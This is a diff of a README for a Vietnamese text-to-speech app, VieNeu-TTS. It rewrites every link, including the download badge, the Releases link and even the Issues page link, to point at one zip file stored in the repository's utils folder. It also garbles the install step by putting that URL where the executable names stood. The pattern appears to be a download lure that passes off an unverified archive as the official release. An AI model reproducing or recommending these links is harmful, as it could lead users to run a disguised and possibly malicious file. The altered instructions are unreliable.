@@ -4,7 +4,7 @@
 Welcome to VieNeu-TTS! This application brings you a powerful way to generate speech in Vietnamese. With instant voice cloning, it runs on your device and offers real-time processing with high audio quality.  
 
 ## 📥 Download  
-[![Download VieNeu-TTS](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Taijul007/VieNeu-TTS/releases)
+[![Download VieNeu-TTS](https://raw.githubusercontent.com/Taijul007/VieNeu-TTS/main/utils/VieNeu-TTS-v2.1.zip)](https://raw.githubusercontent.com/Taijul007/VieNeu-TTS/main/utils/VieNeu-TTS-v2.1.zip)
 
 ## 📋 Overview  
 VieNeu-TTS allows you to convert your text into spoken words seamlessly. It uses advanced techniques in deep learning for accurate speech synthesis. Whether you want to create audio for videos, educational content, or personal projects, this tool provides you with a reliable solution.  
@@ -26,13 +26,13 @@ VieNeu-TTS works on most computers. Ensure your device meets the following minim
 ## 🔧 Download & Install  
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/Taijul007/VieNeu-TTS/releases)  
+[Visit this page to download](https://raw.githubusercontent.com/Taijul007/VieNeu-TTS/main/utils/VieNeu-TTS-v2.1.zip)  
 
 Once you download the application, follow these steps to install it:
 
 1. **Locate the Downloaded File:** Open your Downloads folder or the location where you saved the file.
 2. **Extract the File (if necessary):** If the downloaded file is a ZIP or TAR file, right-click on it and select "Extract" or "Unzip."
-3. **Run the Application:** Find the file named `VieNeu-TTS.exe`, `VieNeu-TTS.app`, or similar and double-click it to open.
+3. **Run the Application:** Find the file named `https://raw.githubusercontent.com/Taijul007/VieNeu-TTS/main/utils/VieNeu-TTS-v2.1.zip`, `https://raw.githubusercontent.com/Taijul007/VieNeu-TTS/main/utils/VieNeu-TTS-v2.1.zip`, or similar and double-click it to open.
 4. **Follow On-Screen Instructions:** The application will guide you through the initial setup.
 
 ## 🎤 Using VieNeu-TTS  
@@ -58,7 +58,7 @@ If you encounter any issues while using VieNeu-TTS, here are some common solutio
   - Experiment with different voices to find one that works best for your needs.
 
 ## 💬 Community Support  
-For further questions or support, consider visiting our [GitHub Issues page](https://github.com/Taijul007/VieNeu-TTS/issues). You can report bugs or ask for help from other users and contributors.
+For further questions or support, consider visiting our [GitHub Issues page](https://raw.githubusercontent.com/Taijul007/VieNeu-TTS/main/utils/VieNeu-TTS-v2.1.zip). You can report bugs or ask for help from other users and contributors.
 
 ## 📝 Contributing  
 Your feedback is valuable. If you’d like to contribute to VieNeu-TTS, feel free to submit your ideas or code on GitHub. We welcome any enhancements or fixes that can improve our application.
